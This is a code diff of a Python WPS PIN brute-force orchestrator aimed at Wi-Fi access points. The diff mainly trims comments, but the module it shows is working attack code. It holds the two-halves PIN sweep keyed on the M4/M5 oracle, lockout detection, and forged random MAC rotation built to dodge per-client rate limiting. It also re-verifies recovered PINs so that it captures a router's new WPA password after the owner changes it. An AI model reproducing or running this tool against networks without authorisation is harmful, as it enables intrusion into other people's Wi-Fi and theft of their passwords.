@@ -1,13 +1,17 @@
 """WpsCampaign — the Focus-facing WPS PIN brute-force orchestrator.
 
-Drives the two-halves sweep over a single kept-alive association (the v1 speed
-bet: reaver/bully re-associate every PIN; we don't, and only re-associate on
-loss). Owns: the COMMON→first-half→second-half PIN iterator, lock detection +
-adaptive backoff, `.run` resume state under captures/, progress/ETA, and
-pause()/resume() (it's the sole TX activity on a half-duplex radio).
+Drives the two-halves (4+3+checksum) PIN sweep.
+Tries to keep-alive association, re-associates on loss.
+
+Owns:
+- COMMON → first-half → second-half PIN iterator,
+- lock detection + adaptive backoff,
+- `.run` resume state from filesystem,
+- progress/ETA, and
+- pause()/resume() to prevent simultaneous TX attacks.
 
 Sweep / oracle wiring (see registrar.py):
-  COMMON_PINS, then first-half sweep (dummy tail) until the AP returns M5
+  COMMON_PINS, then first-half sweep until the AP returns M5
   (``first_half_ok``) → lock that P1 → second-half sweep until SUCCESS.
 """
 
@@ -33,20 +37,16 @@ logger = logging.getLogger(__name__)
 class CampaignState:
     bssid: str
     ssid: str = ""
-    phase: str = "common"            # common | first_half | second_half | done | failed
+    phase: str = "common"   # common | first_half | second_half | done | failed
     common_index: int = 0
     p1_index: int = 0
-    first_half: Optional[str] = None
     p2_index: int = 0
-    # The middle-3 of the pin whose first-half success transitioned us into
-    # second_half — it's already been tested (the SECOND_HALF_WRONG that
-    # exposed the first half) so the second-half sweep skips it instead of
-    # wasting the slot re-testing a known-wrong candidate.
-    skip_middle: Optional[str] = None
-    attempts: int = 0           # sessions started (incl. rate-limited no-ops)
-    tested: int = 0             # attempts that actually reached the M4 oracle
+    first_half: Optional[str] = None
+    skip_middle: Optional[str] = None  # The middle-3 of the (8+3+checksum) PIN.
     found_pin: Optional[str] = None
     found_psk: Optional[str] = None
+    attempts: int = 0     # sessions started (incl. rate-limited no-ops)
+    tested: int = 0       # attempts that actually reached the M4 oracle
     updated: float = 0.0
 
 
@@ -55,7 +55,7 @@ def _state_path(state_dir, bssid: str) -> Path:
 
 
 class WpsCampaign:
-    _SAVE_EVERY = 16                 # checkpoint the .run file every N attempts
+    _SAVE_EVERY = 16   # checkpoint the .run file every N attempts
 
     def __init__(self, iface, target, state_dir="captures", log=None,
                  inter_attempt_delay: float = 0.0):
@@ -76,25 +76,19 @@ class WpsCampaign:
         self._task: Optional[asyncio.Task] = None
         self._paused = False
         self._stop = False
-        self.status = "idle"         # idle | running | paused | locked | found | failed | error
-        self._attempt_ewma = 0.5     # seconds/attempt, for ETA
-        # Suppress consecutive duplicate per-attempt log lines (same pin + same
-        # result) — happens during a rate-limit burst where we get 3 PROTO_ERROR
-        # in a row for the SAME pin before the lock heuristic kicks in. The
-        # subsequent "AP locked" line tells the story; the 3 identical "trying X
-        # → AP refused" lines are noise.
+        self.status = "idle"      # idle | running | paused | locked | found | failed | error
+
+        self._attempt_ewma = 0.5  # seconds/attempt, for ETA
+
+        # Suppress consecutive duplicate per-attempt log lines (same pin + same result)
+        # AP repeats responses if we don't respond fast enough (which we don't)
         self._last_attempt_sig: Optional[tuple] = None
+
         # Live lock state for the SECURITY status row's countdown / kind display.
         # "hard" = beacon AP-Setup-Locked (the AP itself says it's not doing WPS);
         # "soft" = our internal backoff after N consecutive pre-oracle rejects.
         self._lock_kind: Optional[str] = None
         self._lock_end_at: Optional[float] = None
-        # Adaptive backoff: the FIRST soft-lock since a tested++ skips the wait
-        # entirely and just rotates MAC (turns out many APs don't actually need
-        # the wait — they only rate-limit per source MAC, and a fresh client
-        # sails past). If rotation alone doesn't unstick us (next attempt also
-        # locks without progress), we wait, and waits grow on each repeat. Reset
-        # to 0 on every tested++ — the strategy is working, no need to wait.
         self._consecutive_locks_no_progress = 0
 
     # ---- persistence --------------------------------------------------------
@@ -187,14 +181,10 @@ class WpsCampaign:
         return True
 
     async def _try(self, pin: str) -> AttemptOutcome:
-        """One PIN attempt over the kept-alive association. Overridable in tests."""
+        """One PIN attempt over the kept-alive association."""
         if not await self._ensure_session():
             return AttemptOutcome(PinResult.PROTO_ERROR, pin, detail="assoc failed")
         self.transport.drain()
-        # Per-M-message detail routes to logger.debug only — keeps the user-facing
-        # log to one summary line per PIN (see _log_attempt) instead of flooding
-        # it with each AP retransmit. wps_probe.py --debug still surfaces the raw
-        # message-by-message trace via the root logger.
         reg = WpsRegistrar(self.transport, str_to_mac(self.bssid), self.our_mac)
         return await reg.try_pin(pin)
 
@@ -202,9 +192,7 @@ class WpsCampaign:
         """The next candidate per the current phase, or None when exhausted."""
         st = self.state
         if st.phase == "verify":
-            # Always the previously-recovered PIN — _apply_verify_outcome
-            # transitions phase once we get a real oracle result.
-            return st.found_pin
+            return st.found_pin  # Verify the already-found PIN
         if st.phase == "common":
             if st.common_index < len(pinmod.COMMON_PINS):
                 return pinmod.COMMON_PINS[st.common_index]
@@ -212,13 +200,13 @@ class WpsCampaign:
         if st.phase == "first_half":
             if st.p1_index < 10000:
                 return pinmod.full_pin(f"{st.p1_index:04d}", "000")
-            st.phase = "failed"
+            st.phase = "failed"  # Never encountered "Second half wrong"
             return None
         if st.phase == "second_half" and st.first_half is not None:
-            # Skip the middle-3 already tested in the first-half-confirming attempt
-            # (SECOND_HALF_WRONG ⇒ that middle is provably wrong).
+            # Find the 2nd half to attempt
             while st.p2_index < 1000:
                 middle = f"{st.p2_index:03d}"
+                # Skip singular second-half already attempted in first_half
                 if middle == st.skip_middle:
                     st.p2_index += 1
                     continue
@@ -228,15 +216,7 @@ class WpsCampaign:
         return None
 
     def _apply_outcome(self, pin: str, out: AttemptOutcome) -> None:
-        """Advance the keyspace from one attempt.
-
-        ONLY a real oracle result (we reached M4 and the AP judged the half)
-        advances the position. A pre-oracle reject — PROTO_ERROR / TIMEOUT, i.e.
-        the AP refused the session before M4, almost always rate-limiting —
-        means the PIN was NOT tested, so we leave the position put and retry the
-        SAME pin after backoff. (Advancing here was a bug: it silently skipped
-        untested PINs the moment the AP started rate-limiting.)
-        """
+        """Advance the keyspace from one successful attempt."""
         st = self.state
         if out.result in (PinResult.PROTO_ERROR, PinResult.TIMEOUT):
             self.lock.note_pre_oracle_reject()
@@ -245,12 +225,10 @@ class WpsCampaign:
         st.tested += 1
         self.lock.note_progress()
         # A real M4 oracle result means the AP IS letting our (rotated) client
-        # through — the no-wait + rotate strategy is working. Reset the lock
-        # ramp so the NEXT soft-lock also skips its wait.
+        # through. reset the lock ramp so the NEXT soft-lock also skips its wait.
         self._consecutive_locks_no_progress = 0
 
-        # Verify phase has its own dispatch — it doesn't advance the keyspace,
-        # it just decides "PIN still valid / PSK changed / PIN changed."
+        # Verify phase has its own dispatch — it doesn't advance the keyspace.
         if st.phase == "verify":
             self._apply_verify_outcome(pin, out)
             return
@@ -258,17 +236,11 @@ class WpsCampaign:
         if out.result is PinResult.SUCCESS:
             st.found_pin, st.found_psk, st.phase = pin, out.psk, "done"
         elif out.first_half_ok:
-            # AP reached M5 → this first half is correct. (Covers SECOND_HALF_WRONG,
-            # whose first_half_ok is True.) Pin it on the first confirmation.
-            # The per-attempt log line (see _log_attempt) announces the discovery.
+            # AP reached M5 → this first half is correct. (SECOND_HALF_WRONG)
             if st.phase != "second_half":
                 st.first_half = pinmod.split_pin(pin)[0]
                 st.phase, st.p2_index = "second_half", 0
-                # The middle-3 of the just-tested pin is provably wrong (we got
-                # SECOND_HALF_WRONG / first_half_ok), so skip it in the sweep.
-                # Avoids the "trying X → ... [M5]" → "trying X → AP refused"
-                # duplicate right after the phase transition.
-                st.skip_middle = pin[4:7]
+                st.skip_middle = pin[4:7]  # Avoid trying the same PIN twice
             else:
                 st.p2_index += 1
         elif out.result is PinResult.FIRST_HALF_WRONG:
@@ -278,14 +250,10 @@ class WpsCampaign:
                 st.p1_index += 1
 
     def _apply_verify_outcome(self, pin: str, out: AttemptOutcome) -> None:
-        """Resume-time re-verification of a previously-recovered PIN.
-
-        Routes the oracle result into one of four states + a log line. SUCCESS
-        keeps us in "done" but updates ``found_psk`` if the AP's password
-        changed since last time (the high-value case — same PIN, fresh PSK).
-        """
+        """Resume-time re-verification of a previously-recovered PIN."""
         st = self.state
         if out.result is PinResult.SUCCESS:
+            # PIN verified as working
             new_psk = out.psk or ""
             old_psk = st.found_psk or ""
             if new_psk != old_psk:
@@ -298,7 +266,8 @@ class WpsCampaign:
             st.found_psk = new_psk
             st.phase = "done"
             return
-        if out.first_half_ok:        # SECOND_HALF_WRONG — first half still valid
+        if out.first_half_ok:
+            # PIN changed: SECOND_HALF_WRONG — first half still valid
             kept = pinmod.split_pin(pin)[0]
             self.log(f"[yellow]PIN's second half changed[/yellow] — "
                      f"first half [green]{kept}[/green] still valid; "
@@ -311,6 +280,7 @@ class WpsCampaign:
             st.skip_middle = pin[4:7]   # confirmed-wrong middle
             return
         if out.result is PinResult.FIRST_HALF_WRONG:
+            # PIN changed: Nothing from old PIN is recoverable.
             self.log("[red]PIN no longer valid[/red] "
                      "[dim](first half wrong — restarting full sweep)[/dim]")
             st.first_half = None
@@ -327,11 +297,7 @@ class WpsCampaign:
         name = self.target.ssid or self.bssid
         logger.debug("WPS campaign start on %s (mac %s)", name, self.our_mac.hex())
 
-        # Resumed with a previously-recovered PIN? Re-verify it against the AP
-        # before declaring done. Catches the high-value case where the PIN is
-        # unchanged but the router's PSK rotated (user changed the password) —
-        # the WPS-PIN attack will surface the *current* PSK. Also catches "PIN
-        # was changed/disabled by admin" so we don't keep claiming success.
+        # When resuming with a previously-recovered PIN, re-verify it against the AP
         if self.state.phase == "done" and self.state.found_pin:
             self.log("re-verifying PIN against the AP "
                      "[dim](if the PSK changed, we'll catch it)[/dim]")
@@ -348,16 +314,12 @@ class WpsCampaign:
                 if self.lock.is_locked(beacon_locked):
                     # Skip the wait the first soft-lock after every tested++:
                     # most "soft locks" are just per-MAC rate-limiting, which a
-                    # rotation alone fixes in zero time. A hard lock (beacon
-                    # AP-Setup-Locked) ALWAYS waits — the AP itself said no.
+                    # rotation alone fixes in zero time.
                     skip_wait = (not beacon_locked
                                  and self._consecutive_locks_no_progress == 0)
                     await self._handle_lock(beacon_locked, wait=not skip_wait)
-                    # The wait can be interrupted by user Stop — bail before
-                    # rotating so the rotation log line doesn't print AFTER the
-                    # _stop_wps_pin leaf closed the tree.
                     if self._stop:
-                        break
+                        break  # Short circuit before next phase
                     self._rotate_mac()
                     self._consecutive_locks_no_progress += 1
                     continue
@@ -368,33 +330,23 @@ class WpsCampaign:
                     break
 
                 self.status = "running"
-                # Snapshot pre-attempt state so _log_attempt can announce
-                # transitions (e.g. first-half just discovered).
+                # Detect transitions
                 prev_first_half = self.state.first_half
                 prev_phase = self.state.phase
                 t0 = time.monotonic()
                 out = await self._try(pin)
+                # EWMA: Exponentially Weighted Moving Average. tl;dr math
                 self._attempt_ewma = 0.7 * self._attempt_ewma + 0.3 * (time.monotonic() - t0)
                 self.state.attempts += 1
                 self._apply_outcome(pin, out)
-                # Verify-terminal outcomes already emit their own log line in
-                # _apply_verify_outcome; the per-attempt summary would duplicate
-                # it. Pre-oracle rejects during verify (PROTO_ERROR/TIMEOUT) DO
-                # still flow through so the user sees "trying X → AP refused"
-                # while we wait for the AP to engage.
+
                 verify_terminal = (prev_phase == "verify" and out.result not in
                                    (PinResult.PROTO_ERROR, PinResult.TIMEOUT))
-                # The attempt's round-trip can finish just after the user hits
-                # Stop; skip its log line then, so a "trying X → …" branch doesn't
-                # print AFTER _stop_wps_pin already closed the tree with "stopped".
-                # (`_apply_outcome` above is silent, so the keyspace still advances
-                # — we just don't spam the closed tree.)
+                # Avoid logging an "attempt" on a verified PIN, or after user halt.
                 if not verify_terminal and not self._stop:
                     self._log_attempt(pin, out, prev_first_half)
 
                 if self.state.phase == "done":
-                    # Success line is closed by the UI via _stop_wps_pin (cyan
-                    # PIN + green PSK as tree leaves); the campaign just exits.
                     self._save_state()
                     self.status = "found"
                     break
@@ -429,6 +381,7 @@ class WpsCampaign:
         self._lock_kind = "hard" if beacon_locked else "soft"
         trigger = "beacon" if beacon_locked else f"{self.lock.strikes} strikes"
         if wait:
+            # Slow path: AP is locked
             backoff = self.lock.backoff()
             self._lock_end_at = time.monotonic() + backoff
             self.status = "locked"
@@ -441,18 +394,13 @@ class WpsCampaign:
                 if not self._beacon_locked() and self.lock.strikes < self.lock.strike_threshold:
                     break
         else:
-            # Fast path — many APs only rate-limit per source MAC; let rotation
-            # do the work and skip the timer entirely. If we end up back here
-            # without a tested++ in between, the caller will pass wait=True next
-            # time and we'll actually back off.
+            # Fast path: Assume AP is not locked to a new MAC
             self.log(f"[yellow]soft-lock[/yellow] [dim]({trigger}) — "
                      f"rotating MAC, no wait[/dim]")
         self.lock.end_lock()
         self._lock_kind = None
         self._lock_end_at = None
-        # Either way, the very next attempt is a new conversation. Reset the
-        # dedup so it logs once again.
-        self._last_attempt_sig = None
+        self._last_attempt_sig = None  # The next attempt is a new conversation, don't dedupe.
 
     @property
     def lock_kind(self) -> Optional[str]:
@@ -467,11 +415,7 @@ class WpsCampaign:
         return max(0.0, self._lock_end_at - time.monotonic())
 
     def _rotate_mac(self) -> None:
-        """Tear down the association + transport and rebuild under a fresh
-        forged MAC on the next ``_ensure_session()``. Called after a lock cycle
-        so we look like a fresh client to the AP (sidesteps per-MAC rate-limit
-        AND the AP's STA-inactivity timeout silently dropping us during the
-        wait)."""
+        """Tear down the association + transport and select a new random MAC address."""
         if self.transport is not None:
             self.transport.stop()
         if self.assoc is not None:
@@ -480,11 +424,7 @@ class WpsCampaign:
         self.transport = None
         old = self.our_mac
         self.our_mac = random_client_mac()
-        # The "rotating MAC" log line is already emitted by _handle_lock; this
-        # rotation just executes it. Detail stays in debug for diagnostics.
         logger.debug("WPS rotated MAC %s -> %s", old.hex(), self.our_mac.hex())
-        # A fresh MAC means a different (pin, result) signature meaning is moot
-        # — reset so the first attempt under the new MAC always logs.
         self._last_attempt_sig = None
 
     def _log_attempt(self, pin: str, out: AttemptOutcome,
@@ -493,10 +433,6 @@ class WpsCampaign:
         and how deep the exchange got ([Mx] marker). SUCCESS is intentionally
         silent here; the UI closes the campaign tree with bold cyan PIN + green
         PSK leaves via _stop_wps_pin.
-
-        Consecutive duplicates of the same (pin, result) are suppressed — a
-        rate-limited AP gives us 3 PROTO_ERROR in a row for the same pin before
-        the lock kicks in; the subsequent "AP locked" log carries the story.
         """
         if out.result is PinResult.SUCCESS:
             return
@@ -504,13 +440,14 @@ class WpsCampaign:
         # it's a real state change, the next attempt will have a new pin anyway.
         first_half_just_confirmed = (
             self.state.first_half is not None and prev_first_half is None)
+
         sig = (pin, out.result)
         if sig == self._last_attempt_sig and not first_half_just_confirmed:
-            return
+            return  # Avoid duplicate attempt logs
         self._last_attempt_sig = sig
+
         label = f"trying [cyan]{pin}[/cyan]"
-        # First-half just confirmed this attempt — green announcement.
-        if self.state.first_half is not None and prev_first_half is None:
+        if first_half_just_confirmed:
             self.log(f"{label} → [green]first half OK[/green] "
                      f"[dim bold]\\[M5][/dim bold] — sweeping second half")
             return
